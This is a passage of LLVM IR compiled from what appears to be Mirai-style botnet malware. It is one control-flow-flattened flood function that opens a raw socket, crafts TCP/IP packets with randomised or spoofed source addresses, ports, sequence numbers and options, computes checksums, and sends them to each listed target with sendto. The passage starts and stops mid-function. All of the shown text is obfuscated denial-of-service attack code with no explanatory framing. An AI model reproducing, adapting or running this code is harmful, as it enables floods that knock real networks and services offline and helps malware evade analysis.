  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca [256 x i8*], align 16
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %36 = load i8, i8* %5, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %11, align 8
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %12, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %13, align 2
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %15, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %16, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %17, align 2
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 17, i32 65535)
  store i32 %66, i32* %18, align 4
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 18, i32 0)
  store i32 %69, i32* %19, align 4
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 11, i32 0)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %20, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i32 @attack_get_opt_int(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 12, i32 0)
  %77 = trunc i32 %76 to i8
  store i8 %77, i8* %21, align 1
  %78 = load i8, i8* %7, align 1
  %79 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %80 = call i32 @attack_get_opt_int(i8 zeroext %78, %struct.attack_option* %79, i8 zeroext 13, i32 0)
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %22, align 1
  %82 = load i8, i8* %7, align 1
  %83 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %84 = call i32 @attack_get_opt_int(i8 zeroext %82, %struct.attack_option* %83, i8 zeroext 14, i32 0)
  %85 = trunc i32 %84 to i8
  store i8 %85, i8* %23, align 1
  %86 = load i8, i8* %7, align 1
  %87 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %88 = call i32 @attack_get_opt_int(i8 zeroext %86, %struct.attack_option* %87, i8 zeroext 15, i32 0)
  %89 = trunc i32 %88 to i8
  store i8 %89, i8* %24, align 1
  %90 = load i8, i8* %7, align 1
  %91 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %92 = call i32 @attack_get_opt_int(i8 zeroext %90, %struct.attack_option* %91, i8 zeroext 16, i32 0)
  %93 = trunc i32 %92 to i8
  store i8 %93, i8* %25, align 1
  %94 = load i8, i8* %7, align 1
  %95 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %96 = load i32, i32* @LOCAL_ADDR, align 4
  %97 = call i32 @attack_get_opt_ip(i8 zeroext %94, %struct.attack_option* %95, i8 zeroext 25, i32 %96)
  store i32 %97, i32* %26, align 4
  %98 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %98, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -1358274346, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1358274346, label %first
    i32 1897398215, label %101
    i32 999960340, label %102
    i32 1849223729, label %108
    i32 -1434983963, label %111
    i32 -1858481428, label %112
    i32 1276059931, label %118
    i32 -860041456, label %168
    i32 1454880526, label %172
    i32 -1745421547, label %297
    i32 -1616442364, label %300
    i32 589934144, label %301
    i32 813173367, label %302
    i32 -1120755898, label %308
    i32 -454927546, label %328
    i32 1283178718, label %349
    i32 1084222662, label %353
    i32 -572193909, label %357
    i32 -1234587647, label %362
    i32 -1146093825, label %368
    i32 1651727371, label %373
    i32 1704271013, label %379
    i32 312537683, label %384
    i32 1835351506, label %390
    i32 -180570854, label %394
    i32 -1165615216, label %398
    i32 -1362958373, label %402
    i32 1473823712, label %406
    i32 290977017, label %410
    i32 21024714, label %416
    i32 1113782949, label %454
    i32 1142914893, label %457
    i32 -1782416323, label %458
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %99 = icmp eq i32 %.reload, -1
  %100 = select i1 %99, i32 1897398215, i32 999960340
  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -1782416323, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %103 = load i32, i32* %10, align 4
  %104 = bitcast i32* %9 to i8*
  %105 = call i32 @setsockopt(i32 %103, i32 0, i32 3, i8* %104, i32 4) #6
  %106 = icmp eq i32 %105, -1
  %107 = select i1 %106, i32 1849223729, i32 -1434983963
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1782416323, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1858481428, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %9, align 4
  %114 = load i8, i8* %5, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  %117 = select i1 %116, i32 1276059931, i32 -1616442364
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = bitcast [256 x i8*]* %30 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %119, i8* bitcast ([256 x i8*]* @attack_udp_ovhhex.leon_hex to i8*), i64 2048, i32 16, i1 false)
  %120 = call i32 @rand() #6
  %121 = srem i32 %120, 256
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds [256 x i8*], [256 x i8*]* %30, i64 0, i64 %122
  %124 = load i8*, i8** %123, align 8
  store i8* %124, i8** %31, align 8
  %125 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %126 = load i8**, i8*** %11, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8*, i8** %126, i64 %128
  store i8* %125, i8** %129, align 8
  %130 = load i8**, i8*** %11, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds i8*, i8** %130, i64 %132
  %134 = load i8*, i8** %133, align 8
  %135 = bitcast i8* %134 to %struct.iphdr*
  store %struct.iphdr* %135, %struct.iphdr** %27, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i64 1
  %138 = bitcast %struct.iphdr* %137 to %struct.tcphdr*
  store %struct.tcphdr* %138, %struct.tcphdr** %28, align 8
  %139 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %140 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %139, i64 1
  %141 = bitcast %struct.tcphdr* %140 to i8*
  store i8* %141, i8** %29, align 8
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = and i8 %144, 15
  %146 = or i8 %145, 64
  store i8 %146, i8* %143, align 4
  %147 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, -16
  %151 = or i8 %150, 5
  store i8 %151, i8* %148, align 4
  %152 = load i8, i8* %12, align 1
  %153 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 1
  store i8 %152, i8* %154, align 1
  %155 = call zeroext i16 @htons(i16 zeroext 60) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 2
  store i16 %155, i16* %157, align 2
  %158 = load i16, i16* %13, align 2
  %159 = call zeroext i16 @htons(i16 zeroext %158) #7
  %160 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 3
  store i16 %159, i16* %161, align 4
  %162 = load i8, i8* %14, align 1
  %163 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 5
  store i8 %162, i8* %164, align 4
  %165 = load i8, i8* %15, align 1
  %166 = icmp ne i8 %165, 0
  %167 = select i1 %166, i32 -860041456, i32 1454880526
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  store i32 1454880526, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  %173 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 6, i8* %174, align 1
  %175 = load i32, i32* %26, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %16, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 4
  %190 = load i16, i16* %17, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i32, i32* %18, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = zext i16 %196 to i32
  %198 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %199 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %198, i32 0, i32 2
  store i32 %197, i32* %199, align 4
  %200 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %201 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %200, i32 0, i32 4
  %202 = load i16, i16* %201, align 4
  %203 = and i16 %202, -241
  %204 = or i16 %203, 160
  store i16 %204, i16* %201, align 4
  %205 = load i8, i8* %20, align 1
  %206 = sext i8 %205 to i16
  %207 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %208 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = and i16 %206, 1
  %211 = shl i16 %210, 13
  %212 = and i16 %209, -8193
  %213 = or i16 %212, %211
  store i16 %213, i16* %208, align 4
  %214 = load i8, i8* %21, align 1
  %215 = sext i8 %214 to i16
  %216 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = and i16 %215, 1
  %220 = shl i16 %219, 12
  %221 = and i16 %218, -4097
  %222 = or i16 %221, %220
  store i16 %222, i16* %217, align 4
  %223 = load i8, i8* %22, align 1
  %224 = sext i8 %223 to i16
  %225 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %226 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = and i16 %224, 1
  %229 = shl i16 %228, 11
  %230 = and i16 %227, -2049
  %231 = or i16 %230, %229
  store i16 %231, i16* %226, align 4
  %232 = load i8, i8* %23, align 1
  %233 = sext i8 %232 to i16
  %234 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %233, 1
  %238 = shl i16 %237, 10
  %239 = and i16 %236, -1025
  %240 = or i16 %239, %238
  store i16 %240, i16* %235, align 4
  %241 = load i8, i8* %24, align 1
  %242 = sext i8 %241 to i16
  %243 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %244 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %243, i32 0, i32 4
  %245 = load i16, i16* %244, align 4
  %246 = and i16 %242, 1
  %247 = shl i16 %246, 9
  %248 = and i16 %245, -513
  %249 = or i16 %248, %247
  store i16 %249, i16* %244, align 4
  %250 = load i8, i8* %25, align 1
  %251 = sext i8 %250 to i16
  %252 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = and i16 %251, 1
  %256 = shl i16 %255, 8
  %257 = and i16 %254, -257
  %258 = or i16 %257, %256
  store i16 %258, i16* %253, align 4
  %259 = load i8*, i8** %29, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %29, align 8
  store i8 2, i8* %259, align 1
  %261 = load i8*, i8** %29, align 8
  %262 = getelementptr inbounds i8, i8* %261, i32 1
  store i8* %262, i8** %29, align 8
  store i8 4, i8* %261, align 1
  %263 = call i32 @rand_next()
  %264 = and i32 %263, 15
  %265 = add i32 1400, %264
  %266 = trunc i32 %265 to i16
  %267 = call zeroext i16 @htons(i16 zeroext %266) #7
  %268 = load i8*, i8** %29, align 8
  %269 = bitcast i8* %268 to i16*
  store i16 %267, i16* %269, align 2
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i64 2
  store i8* %271, i8** %29, align 8
  %272 = load i8*, i8** %29, align 8
  %273 = getelementptr inbounds i8, i8* %272, i32 1
  store i8* %273, i8** %29, align 8
  store i8 4, i8* %272, align 1
  %274 = load i8*, i8** %29, align 8
  %275 = getelementptr inbounds i8, i8* %274, i32 1
  store i8* %275, i8** %29, align 8
  store i8 2, i8* %274, align 1
  %276 = load i8*, i8** %29, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %29, align 8
  store i8 8, i8* %276, align 1
  %278 = load i8*, i8** %29, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %29, align 8
  store i8 10, i8* %278, align 1
  %280 = call i32 @rand_next()
  %281 = load i8*, i8** %29, align 8
  %282 = bitcast i8* %281 to i32*
  store i32 %280, i32* %282, align 4
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i64 4
  store i8* %284, i8** %29, align 8
  %285 = load i8*, i8** %29, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 0, i32* %286, align 4
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %29, align 8
  %289 = load i8*, i8** %29, align 8
  %290 = getelementptr inbounds i8, i8* %289, i32 1
  store i8* %290, i8** %29, align 8
  store i8 1, i8* %289, align 1
  %291 = load i8*, i8** %29, align 8
  %292 = getelementptr inbounds i8, i8* %291, i32 1
  store i8* %292, i8** %29, align 8
  store i8 3, i8* %291, align 1
  %293 = load i8*, i8** %29, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %29, align 8
  store i8 3, i8* %293, align 1
  %295 = load i8*, i8** %29, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %29, align 8
  store i8 6, i8* %295, align 1
  store i32 -1745421547, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i32, i32* %9, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %9, align 4
  store i32 -1858481428, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 589934144, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 813173367, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %9, align 4
  %304 = load i8, i8* %5, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp slt i32 %303, %305
  %307 = select i1 %306, i32 -1120755898, i32 1142914893
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i8**, i8*** %11, align 8
  %310 = load i32, i32* %9, align 4
  %311 = sext i32 %310 to i64
  %312 = getelementptr inbounds i8*, i8** %309, i64 %311
  %313 = load i8*, i8** %312, align 8
  store i8* %313, i8** %32, align 8
  %314 = load i8*, i8** %32, align 8
  %315 = bitcast i8* %314 to %struct.iphdr*
  store %struct.iphdr* %315, %struct.iphdr** %33, align 8
  %316 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i64 1
  %318 = bitcast %struct.iphdr* %317 to %struct.tcphdr*
  store %struct.tcphdr* %318, %struct.tcphdr** %34, align 8
  %319 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %320 = load i32, i32* %9, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %319, i64 %321
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %322, i32 0, i32 2
  %324 = load i8, i8* %323, align 4
  %325 = zext i8 %324 to i32
  %326 = icmp slt i32 %325, 32
  %327 = select i1 %326, i32 -454927546, i32 1283178718
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 1
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @ntohl(i32 %334) #7
  %336 = call i32 @rand_next()
  %337 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %338 = load i32, i32* %9, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i64 %339
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %340, i32 0, i32 2
  %342 = load i8, i8* %341, align 4
  %343 = zext i8 %342 to i32
  %344 = lshr i32 %336, %343
  %345 = add i32 %335, %344
  %346 = call i32 @htonl(i32 %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 9
  store i32 %346, i32* %348, align 4
  store i32 1283178718, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i32, i32* %26, align 4
  %351 = icmp eq i32 %350, -1
  %352 = select i1 %351, i32 1084222662, i32 -572193909
  store i32 %352, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = call i32 @rand_next()
  %355 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 8
  store i32 %354, i32* %356, align 4
  store i32 -572193909, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i16, i16* %13, align 2
  %359 = zext i16 %358 to i32
  %360 = icmp eq i32 %359, 65535
  %361 = select i1 %360, i32 -1234587647, i32 -1146093825
  store i32 %361, i32* %switchVar
  br label %loopEnd

; <label>:362:                                    ; preds = %loopEntry
  %363 = call i32 @rand_next()
  %364 = and i32 %363, 65535
  %365 = trunc i32 %364 to i16
  %366 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 3
  store i16 %365, i16* %367, align 4
  store i32 -1146093825, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i16, i16* %16, align 2
  %370 = zext i16 %369 to i32
  %371 = icmp eq i32 %370, 65535
  %372 = select i1 %371, i32 1651727371, i32 1704271013
  store i32 %372, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = call i32 @rand_next()
  %375 = and i32 %374, 65535
  %376 = trunc i32 %375 to i16
  %377 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %378 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %377, i32 0, i32 0
  store i16 %376, i16* %378, align 4
  store i32 1704271013, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i16, i16* %17, align 2
  %381 = zext i16 %380 to i32
  %382 = icmp eq i32 %381, 65535
  %383 = select i1 %382, i32 312537683, i32 1835351506
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = and i32 %385, 65535
  %387 = trunc i32 %386 to i16
  %388 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 1
  store i16 %387, i16* %389, align 2
  store i32 1835351506, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %18, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 -180570854, i32 -1165615216
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 2
  store i32 %395, i32* %397, align 4
  store i32 -1165615216, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i32, i32* %19, align 4
  %400 = icmp eq i32 %399, 65535
  %401 = select i1 %400, i32 -1362958373, i32 1473823712
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %405 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %404, i32 0, i32 3
  store i32 %403, i32* %405, align 4
  store i32 1473823712, i32* %switchVar
  br label %loopEnd

; <label>:406:                                    ; preds = %loopEntry
  %407 = load i8, i8* %20, align 1
  %408 = icmp ne i8 %407, 0
  %409 = select i1 %408, i32 290977017, i32 21024714
  store i32 %409, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = call i32 @rand_next()
  %412 = and i32 %411, 65535
  %413 = trunc i32 %412 to i16
  %414 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  store i32 21024714, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 7
  store i16 0, i16* %418, align 2
  %419 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %420 = bitcast %struct.iphdr* %419 to i16*
  %421 = call zeroext i16 @checksum_generic(i16* %420, i32 20)
  %422 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %423 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %422, i32 0, i32 7
  store i16 %421, i16* %423, align 2
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 0, i16* %425, align 4
  %426 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %427 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %428 = bitcast %struct.tcphdr* %427 to i8*
  %429 = call zeroext i16 @htons(i16 zeroext 40) #7
  %430 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %426, i8* %428, i16 zeroext %429, i32 40)
  %431 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 6
  store i16 %430, i16* %432, align 4
  %433 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 1
  %435 = load i16, i16* %434, align 2
  %436 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %437 = load i32, i32* %9, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %438
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %439, i32 0, i32 0
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %440, i32 0, i32 1
  store i16 %435, i16* %441, align 2
  %442 = load i32, i32* %10, align 4
  %443 = load i8*, i8** %32, align 8
  %444 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %445 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %446 = load i32, i32* %9, align 4
  %447 = sext i32 %446 to i64
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %445, i64 %447
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %448, i32 0, i32 0
  %450 = bitcast %struct.sockaddr_in* %449 to %struct.sockaddr*
  store %struct.sockaddr* %450, %struct.sockaddr** %444, align 8
  %451 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %452 = load %struct.sockaddr*, %struct.sockaddr** %451, align 8
  %453 = call i64 @sendto(i32 %442, i8* %443, i64 60, i32 16384, %struct.sockaddr* %452, i32 16)
  store i32 1113782949, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i32, i32* %9, align 4
  %456 = add nsw i32 %455, 1
  store i32 %456, i32* %9, align 4
